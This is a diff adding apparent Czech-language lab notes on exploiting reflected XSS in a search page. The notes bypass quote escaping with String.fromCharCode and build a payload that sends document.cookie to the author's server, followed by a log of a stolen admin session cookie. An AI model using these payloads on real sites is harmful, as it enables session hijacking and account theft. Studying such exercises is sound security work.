@@ -1,0 +1,41 @@
+Do query můžeme vkládat jak http tak i javascript
+Zkusíme klasiku alert - <script>alert("AHOJ")</script>
+Tohle nám nebude fungovat, protože jak zjistíme po inspekci stránky " se mění na \"
+Můžeme obejít přes fromCharCode
+------------------------------------------------------------------------
+<script>alert(String.fromCharCode(65,72,79,74));</script>
+------------------------------------------------------------------------
+Tohle nám bude fungovat
+Zkusíme tedy ukrást Cookie
+------------------------------------------------------------------------
+<script>alert(String.fromCharCode(65,72,79,74)+document.cookie);</script>
+------------------------------------------------------------------------
+Ale tohle nám zase nebude fungovat
+Když se podíváme do inspectu zjistíme, že je to implementované bez +, což nám vyjde jako chyba v syntaxi
+Tak co můžeme udělat když nelze použít +
+Například můžeme vytvořit proměnné a ty pak následně spojit
+------------------------------------------------------------------------
+<script>var test = String.fromCharCode(65,72,79,74);test = test.concat(document.cookie);alert(test);</script>
+------------------------------------------------------------------------
+A máme všechny cookie v alertu
+No tak teď to jen převést k nám ať si můžeme na těch cookies pochutnat
+Na to potřebujeme php server, který nám bude přijímat cookie jako parametr
+U mě by to například vypadalo takto
+------------------------------------------------------------------------
+http://10.0.2.15/?c=blabla
+------------------------------------------------------------------------
+Tak to převedeme do scriptu
+------------------------------------------------------------------------
+<script>var u = String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,63,99,61);u=u.concat(document.cookie);window.location.replace(u);</script>
+------------------------------------------------------------------------
+A toto nám redirectne stárnku na danou adresu a můj server nás pošle zpět na search, s parametrem admin
+Po provedení mám v logu jako příklad..
+------------------------------------------------------------------------
+Date and Time: 2020/12/07 04:09:24
+IP Address: 10.0.2.15
+Hostname: kali
+Port Number: 34864
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+HTTP Referer: http://10.0.2.10/inc/search.php?query=%3Cscript%3Evar%20u%20=%20String.fromCharCode(104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,53,47,63,99,61);u=u.concat(document.cookie);window.location.replace(u);%3C/script%3E
+Cookie - PHPSESSID=cf0a2784f5baaa88a016ec5; debug=0; redirect=0; testing=1; lang=en; eshopbasket=a:1:{i:0;a:3:{s:2:"id";i:4;s:5:"price";d:15;s:6:"amount";d:2;}}; userrole=admin
+------------------------------------------------------------------------
